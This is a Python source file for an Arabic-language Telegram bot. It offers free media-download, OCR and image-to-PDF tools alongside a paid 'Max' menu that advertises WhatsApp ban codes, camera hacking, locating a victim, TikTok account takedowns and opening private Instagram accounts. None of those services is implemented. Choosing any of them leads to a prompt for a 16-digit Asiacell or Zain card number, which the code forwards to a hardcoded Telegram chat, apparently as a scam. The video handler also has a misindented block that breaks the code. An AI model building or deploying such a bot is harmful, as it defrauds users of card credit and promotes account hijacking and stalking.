import os
import signal
import sys
import telebot
from telebot import types
from flask import Flask
from threading import Thread
import services

TOKEN = os.environ.get('TOKEN')
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("الاشتراك المجاني", callback_data='free_sub'),
               types.InlineKeyboardButton("اشتراك ماكس ✨", callback_data='max_sub'))
    bot.send_message(message.chat.id, "أهلاً بك في ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'free_sub':
        my_free_names = ["تحميل ستوري", "تحميل أي فيديو ", "ترجمة صورة الى نص", "تحويل صورة لـ PDF"]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
        markup.add(*buttons)
        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'f1':
        msg = bot.send_message(call.message.chat.id, "أرسل الآن يوزر (معرف) الحساب:")
        bot.register_next_step_handler(msg, process_insta_username)
    elif call.data == 'f2':
        msg = bot.send_message(call.message.chat.id, "أرسل لي رابط الفيديو:")
        bot.register_next_step_handler(msg, process_video_link)
    elif call.data == 'f3':
        msg = bot.send_message(call.message.chat.id, "أرسل الصورة التي تريد استخراج النص منها:")
        bot.register_next_step_handler(msg, process_ocr)
    elif call.data == 'f4':
        msg = bot.send_message(call.message.chat.id, "أرسل لي الصورة الآن:")
        bot.register_next_step_handler(msg, process_image_to_pdf)
    
    elif call.data == 'max_sub':
        my_names = [" 💀واتساب 🟡 ", "يوزرات تلي مميزة👑 ", "كود حظر واتس⚡️ ", "اختراق كاميرا📷 ", "معرفة موقع الضحية ","دعس حساب تيكتوك☠️ ", "أرقام فيك ✅ ", "فتح انستا برايفت👀 ", "فك حظر سافيوم994+ ", "كود حظر واتس", "مزايا انستا ✨", "تلغيم رابط🌎 ", "ببجي🎮 ", "رشق انستا✅ ", "تفعيل التطبيقات برو ", " 📱بليلردو لانهائي8 ", "اداة تيكتوك ترول ", "ازالة الاعلانات📢 ", "ارقام مفعلة حقيقيه✅", "تطبيقات ايفون برو "]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
        markup.add(*buttons)
        bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
        bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'activate_max':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
        bot.edit_message_text("اختر مزود الخدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith('provider_'):
        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
        msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nيرجى إرسال رقم البطاقة (16 رقماً):")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# ... (داخل دالة process_insta_username)
def process_insta_username(message):
    username = message.text.replace('@', '').strip()
    wait_msg = bot.send_message(message.chat.id, "🔍 جاري البحث...")
    try:
        # هنا التعديل: استدعاء الاسم الجديد الصحيح
        items = services.get_insta_media(username)
        
        if not items:
            bot.send_message(message.chat.id, "لم يتم العثور على ستوري.")
        else:
            for item in items:
                with open(item['filepath'], 'rb') as video:
                    bot.send_video(message.chat.id, video)
                os.remove(item['filepath'])
        bot.delete_message(message.chat.id, wait_msg.message_id)
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ خطأ: {str(e)[:50]}")
# ... (باقي الكود كما هو)

def process_video_link(message):
    url = message.text.strip()
    chat_id = message.chat.id
    file_name = f"video_{chat_id}.mp4" # هذا هو الاسم الموحد
    
    wait_msg = bot.send_message(chat_id, "⏳ جاري التحميل...")
    
    try:
        # الآن نمرر الاسم (file_name) للسيرفس
        services.download_video_service(url, file_name) 
        
        with open(file_name, 'rb') as video:
            bot.send_video(chat_id, video)
            
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")
        
        finally:
        if os.path.exists(file_name):
            os.remove(file_name)
            print(f"✅ تم حذف الملف {file_name} بنجاح وتحرير الذاكرة.") # هذا سيظهر في الـ Logs
        
        try:
            bot.delete_message(chat_id, wait_msg.message_id)
        except:
            pass

 
def process_ocr(message):
    if message.content_type == 'photo':
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("img.jpg", 'wb') as f: f.write(downloaded_file)
        
        text = services.extract_text_from_image("img.jpg")
        translated = services.translate_text(text)
        
        bot.send_message(message.chat.id, f"📜 النص المستخرج:\n{text}\n\n🌍 الترجمة:\n{translated}")
        os.remove("img.jpg")
    else:
        bot.reply_to(message, "يرجى إرسال صورة واضحة.")


def process_image_to_pdf(message):
    if message.content_type == 'photo':
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("image.jpg", 'wb') as new_file:
            new_file.write(downloaded_file)
        services.convert_to_pdf("image.jpg", "output.pdf")
        with open("output.pdf", 'rb') as pdf:
            bot.send_document(message.chat.id, pdf)
        os.remove("image.jpg"); os.remove("output.pdf")
    else:
        bot.reply_to(message, "يرجى إرسال صورة فقط.")

def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "جاري التفعيل..")
        try: bot.send_message(438077185, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
        except: pass
    else:
        msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

app = Flask('')
@app.route('/')
def home(): return "البوت يعمل!"

# ... (باقي الكود الخاص بك)

def shutdown(signum, frame):
    print("إيقاف البوت...")
    bot.stop_polling()
    sys.exit(0)

signal.signal(signal.SIGINT, shutdown)
signal.signal(signal.SIGTERM, shutdown)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    # تشغيل Flask
    Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()

    # تشغيل البوت
    print("جاري تشغيل البوت...")
    bot.remove_webhook()
    bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
